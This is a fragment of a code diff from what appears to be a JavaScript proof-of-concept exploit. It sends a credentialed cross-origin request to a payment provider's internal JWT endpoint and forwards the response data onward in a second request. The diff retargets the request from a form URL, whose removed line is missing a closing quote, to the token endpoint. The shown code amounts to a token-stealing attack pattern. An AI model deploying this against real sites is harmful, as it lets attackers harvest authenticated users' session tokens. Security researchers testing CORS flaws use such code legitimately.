@@ -15,7 +15,7 @@ console.log(a);
 xhttp.send("data="+a);
 }
 };
-xhttp.open("GET", "https://tokensoft.typeform.com/forms/k2PYz21f/complete-submission, true);
+xhttp.open("GET", "https://api.sandbox.hyperwallet.com/rest/internal/v1/jwts?returnConfigs=tutorialProgramToken", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
